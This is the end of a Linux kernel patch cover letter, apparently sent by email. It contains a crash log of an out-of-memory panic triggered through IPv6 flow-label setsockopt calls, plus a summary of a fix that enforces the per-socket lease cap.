[  261.240125][ T9280] perf_event                 0KB         31KB=0D
[  261.241428][ T9280] trace_event_file         874KB        876KB=0D
[  261.246030][ T9280] ftrace_event_field       1969KB       1972KB=0D
[  261.251628][ T9280] pool_workqueue           754KB        787KB=0D
[  261.254973][ T9280] maple_node               670KB       2457KB=0D
[  261.264769][ T9280] mm_struct                 65KB        187KB=0D
[  261.272749][ T9280] vmap_area                930KB        936KB=0D
[  261.276921][ T9280] debug_objects_cache       2763KB       3221KB=0D
[  261.288741][ T9280] page->ptl                 48KB        130KB=0D
[  261.290051][ T9280] kmalloc-cg-8k            168KB        192KB=0D
[  261.298945][ T9280] kmalloc-cg-4k           1080KB       1152KB=0D
[  261.299804][ T9280] kmalloc-cg-2k           1356KB       1500KB=0D
[  261.310383][ T9280] kmalloc-cg-1k            204KB        330KB=0D
[  261.319402][ T9280] kmalloc-cg-512           108KB        283KB=0D
[  261.324394][ T9280] kmalloc-cg-256            57KB         78KB=0D
[  261.329031][ T9280] kmalloc-cg-128            35KB         55KB=0D
[  261.330364][ T9280] kmalloc-cg-64             94KB        344KB=0D
[  261.338237][ T9280] kmalloc-cg-32           1266KB       1299KB=0D
[  261.339073][ T9280] kmalloc-cg-16              6KB         15KB=0D
[  261.344055][ T9280] kmalloc-cg-8              12KB         23KB=0D
[  261.353878][ T9280] kmalloc-cg-192            22KB         47KB=0D
[  261.361414][ T9280] kmalloc-cg-96           1684KB       1712KB=0D
[  261.372756][ T9280] kmalloc-8k              2400KB       2568KB=0D
[  261.375232][ T9280] kmalloc-4k              3936KB       6168KB=0D
[  261.382562][ T9280] kmalloc-2k             13098KB      13470KB=0D
[  261.383939][ T9280] kmalloc-1k             24330KB      24720KB=0D
[  261.395436][ T9280] kmalloc-512            16783KB      17419KB=0D
[  261.396429][ T9280] kmalloc-256             4850KB       4851KB=0D
[  261.402725][ T9280] kmalloc-128            37486KB      40150KB=0D
[  261.406469][ T9280] kmalloc-64              5589KB       5956KB=0D
[  261.409839][ T9280] kmalloc-32            709883KB     709884KB=0D
[  261.410848][ T9280] kmalloc-16              2808KB       2851KB=0D
[  261.416940][ T9280] kmalloc-8               1699KB       1752KB=0D
[  261.417933][ T9280] kmalloc-192             1387KB       1740KB=0D
[  261.422648][ T9280] kmalloc-96              2370KB       2540KB=0D
[  261.428794][ T9280] kmem_cache_node          179KB        180KB=0D
[  261.435368][ T9280] kmem_cache               214KB        220KB=0D
[  261.442984][ T9280] Memory cgroup min protection 0kB -- low protection 0=
kB=0D
[  261.442995][ T9280] Tasks state (memory values in pages):=0D
[  261.452779][ T9280] [  pid  ]   uid  tgid total_vm      rss rss_anon rss=
_file rss_shmem pgtables_bytes swapents oom_score_adj name=0D
[  261.460339][ T9280] [   4982]     0  4982    10047      229      226    =
    2         1    94208        0          -250 systemd-journal=0D
[  261.468413][ T9280] [   4995]     0  4995     9313     2938     2936    =
    2         0    98304        0         -1000 systemd-udevd=0D
[  261.472913][ T9280] [   8767]     0  8767     1411       70       68    =
    2         0    49152        0             0 cron=0D
[  261.478782][ T9280] [   8807]     0  8807    55235      378      375    =
    3         0    77824        0             0 rsyslogd=0D
[  261.480677][ T9280] [   9092]     0  9092    24967      353      351    =
    2         0    73728        0             0 dhclient=0D
[  261.482292][ T9280] [   9125]     0  9125     3336      244      242    =
    2         0    65536        0         -1000 sshd=0D
[  261.487220][ T9280] [   9126]     0  9126      720       35       33    =
    2         0    45056        0             0 agetty=0D
[  261.488607][ T9280] [   9127]     0  9127      720       34       32    =
    2         0    40960        0             0 agetty=0D
[  261.492648][ T9280] [   9128]     0  9128      720       35       33    =
    2         0    45056        0             0 agetty=0D
[  261.496824][ T9280] [   9129]     0  9129      720       34       32    =
    2         0    53248        0             0 agetty=0D
[  261.500751][ T9280] [   9131]     0  9131      720       34       32    =
    2         0    49152        0             0 agetty=0D
[  261.504507][ T9280] [   9132]     0  9132      720       34       32    =
    2         0    45056        0             0 agetty=0D
[  261.510431][ T9280] [   9133]     0  9133     1101       37       35    =
    2         0    49152        0             0 agetty=0D
[  261.527985][ T9280] [   9136]     0  9136    14097      390      389    =
    1         0    90112        0             0 nginx=0D
[  261.536055][ T9280] [   9137]    33  9137    14190      471      469    =
    2         0    90112        0             0 nginx=0D
[  261.543133][ T9280] [   9138]    33  9138    14190      471      469    =
    2         0    90112        0             0 nginx=0D
[  261.547022][ T9280] [   9268]     0  9268     3452      292      290    =
    2         0    65536        0             0 sshd=0D
[  261.550363][ T9280] [   9274]  1001  9274     3452      292      290    =
    2         0    65536        0             0 sshd=0D
[  261.555411][ T9280] [   9275]  1001  9275     8478       21       20    =
    1         0    49152        0             0 poc=0D
[  261.562751][ T9280] Kernel panic - not syncing: Out of memory: compulsor=
y panic_on_oom is enabled=0D
[  261.563851][ T9280] CPU: 0 UID: 1001 PID: 9280 Comm: poc Not tainted 7.1=
.0-rc2-g6f381f63ccfe-dirty #3 PREEMPT(full)=0D
[  261.565268][ T9280] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PII=
X, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014=0D
[  261.566854][ T9280] Call Trace:=0D
[  261.567335][ T9280]  <TASK>=0D
[  261.567745][ T9280]  dump_stack_lvl+0x3b/0x1f0=0D
[  261.568422][ T9280]  vpanic+0x99f/0xa80=0D
[  261.568920][ T9280]  ? __pfx_vpanic+0x10/0x10=0D
[  261.569945][ T9280]  ? _raw_spin_unlock_irqrestore+0x3b/0x80=0D
[  261.570624][ T9280]  panic+0xca/0xd0=0D
[  261.571061][ T9280]  ? __pfx_panic+0x10/0x10=0D
[  261.571616][ T9280]  ? __rcu_read_unlock+0x297/0x5c0=0D
[  261.572205][ T9280]  ? dump_header+0x6e9/0x980=0D
[  261.572737][ T9280]  ? out_of_memory+0x8a8/0x1680=0D
[  261.573304][ T9280]  out_of_memory+0x8d6/0x1680=0D
[  261.574031][ T9280]  ? __pfx_out_of_memory+0x10/0x10=0D
[  261.575240][ T9280]  __alloc_frozen_pages_noprof+0x2309/0x2b00=0D
[  261.576097][ T9280]  ? __pfx___alloc_frozen_pages_noprof+0x10/0x10=0D
[  261.576968][ T9280]  ? __lock_acquire+0x45c/0x25f0=0D
[  261.577706][ T9280]  ? __sanitizer_cov_trace_switch+0x54/0x90=0D
[  261.578706][ T9280]  ? policy_nodemask+0xed/0x4f0=0D
[  261.579438][ T9280]  alloc_pages_mpol+0x1fb/0x540=0D
[  261.580002][ T9280]  ? __pfx_alloc_pages_mpol+0x10/0x10=0D
[  261.580626][ T9280]  ? __lock_acquire+0x45c/0x25f0=0D
[  261.581225][ T9280]  ? unwind_get_return_address+0x59/0xa0=0D
[  261.581856][ T9280]  new_slab+0x458/0x670=0D
[  261.582395][ T9280]  ? find_held_lock+0x2b/0x80=0D
[  261.582988][ T9280]  ___slab_alloc+0x2c4/0x7f0=0D
[  261.583521][ T9280]  ? fl_create+0x104/0xd30=0D
[  261.584046][ T9280]  ? __pcs_replace_empty_main+0x3e3/0x640=0D
[  261.584713][ T9280]  __kmalloc_cache_noprof+0x389/0x6e0=0D
[  261.585323][ T9280]  ? fl_create+0x104/0xd30=0D
[  261.586423][ T9280]  fl_create+0x104/0xd30=0D
[  261.587324][ T9280]  ? do_sock_setsockopt+0xf3/0x1d0=0D
[  261.587919][ T9280]  ? __sys_setsockopt+0x19a/0x230=0D
[  261.588479][ T9280]  ? __x64_sys_setsockopt+0xbd/0x160=0D
[  261.589085][ T9280]  ? do_syscall_64+0x116/0xf80=0D
[  261.589666][ T9280]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f=0D
[  261.590941][ T9280]  ? __pfx_fl_create+0x10/0x10=0D
[  261.591522][ T9280]  ? __lock_acquire+0x45c/0x25f0=0D
[  261.592115][ T9280]  ? find_held_lock+0x2b/0x80=0D
[  261.592657][ T9280]  ? __might_fault+0xbc/0x130=0D
[  261.593192][ T9280]  ? __might_fault+0xbc/0x130=0D
[  261.593718][ T9280]  ipv6_flowlabel_opt+0x50f/0x2d70=0D
[  261.594526][ T9280]  ? __pfx_ipv6_flowlabel_opt+0x10/0x10=0D
[  261.595450][ T9280]  ? __pfx_do_raw_spin_lock+0x10/0x10=0D
[  261.596203][ T9280]  ? __local_bh_enable_ip+0xa2/0x120=0D
[  261.596834][ T9280]  ? do_ipv6_setsockopt+0x1b4a/0x4640=0D
[  261.597495][ T9280]  do_ipv6_setsockopt+0x1b4a/0x4640=0D
[  261.598187][ T9280]  ? __print_lock_name+0x40/0xe0=0D
[  261.598975][ T9280]  ? __pfx_do_ipv6_setsockopt+0x10/0x10=0D
[  261.599667][ T9280]  ? avc_has_perm_noaudit+0x11e/0x3b0=0D
[  261.600306][ T9280]  ? avc_has_perm_noaudit+0x145/0x3b0=0D
[  261.600919][ T9280]  ? avc_has_perm+0x141/0x1f0=0D
[  261.601469][ T9280]  ? __pfx_avc_has_perm+0x10/0x10=0D
[  261.602073][ T9280]  ? find_held_lock+0x2b/0x80=0D
[  261.603002][ T9280]  ? finish_task_switch.isra.0+0x2c3/0x1080=0D
[  261.603860][ T9280]  ? sock_has_perm+0x25a/0x2f0=0D
[  261.604575][ T9280]  ? __pfx_sock_has_perm+0x10/0x10=0D
[  261.605301][ T9280]  ? selinux_netlbl_socket_setsockopt+0x183/0x470=0D
[  261.606436][ T9280]  ? __pfx_selinux_netlbl_socket_setsockopt+0x10/0x10=
=0D
[  261.607419][ T9280]  ? ipv6_setsockopt+0xcb/0x170=0D
[  261.608113][ T9280]  ipv6_setsockopt+0xcb/0x170=0D
[  261.608857][ T9280]  udpv6_setsockopt+0x64/0xb0=0D
[  261.609612][ T9280]  ? __pfx_sock_common_setsockopt+0x10/0x10=0D
[  261.610571][ T9280]  do_sock_setsockopt+0xf3/0x1d0=0D
[  261.612186][ T9280]  __sys_setsockopt+0x19a/0x230=0D
[  261.613047][ T9280]  __x64_sys_setsockopt+0xbd/0x160=0D
[  261.613916][ T9280]  ? do_syscall_64+0x90/0xf80=0D
[  261.615052][ T9280]  ? lockdep_hardirqs_on+0x7b/0x110=0D
[  261.615874][ T9280]  do_syscall_64+0x116/0xf80=0D
[  261.616540][ T9280]  ? clear_bhb_loop+0x40/0x90=0D
[  261.617298][ T9280]  entry_SYSCALL_64_after_hwframe+0x77/0x7f=0D
[  261.618259][ T9280] RIP: 0033:0x4218ce=0D
[  261.618931][ T9280] Code: Unable to access opcode bytes at 0x4218a4.=0D
[  261.620078][ T9280] RSP: 002b:00007fb2b56d01e8 EFLAGS: 00000286 ORIG_RAX=
: 0000000000000036=0D
[  261.621431][ T9280] RAX: ffffffffffffffda RBX: 00000000000e4359 RCX: 000=
00000004218ce=0D
[  261.623069][ T9280] RDX: 0000000000000020 RSI: 0000000000000029 RDI: 000=
0000000000006=0D
[  261.624254][ T9280] RBP: 000000000968d9a0 R08: 0000000000000020 R09: 000=
0000000000000=0D
[  261.625393][ T9280] R10: 00007fb2b56d01f0 R11: 0000000000000286 R12: 000=
0000000000006=0D
[  261.626819][ T9280] R13: 00007fb2b56d01f0 R14: 0000000000499075 R15: 000=
07fff06d5a7d0=0D
[  261.628875][ T9280]  </TASK>=0D
[  261.629974][ T9280] Kernel Offset: disabled=0D
[  261.630682][ T9280] Rebooting in 86400 seconds..=0D
=0D
-----END crash log-----=0D
=0D
Best regards,=0D
Zhiling Zou=0D
=0D
Zhiling Zou (1):=0D
  ipv6: flowlabel: enforce the per-socket lease cap on reused labels=0D
=0D
 net/ipv6/ip6_flowlabel.c | 33 +++++++++++++++++++++++++++++----=0D
 1 file changed, 29 insertions(+), 4 deletions(-)=0D
=0D
-- =0D
2.43.0=0D
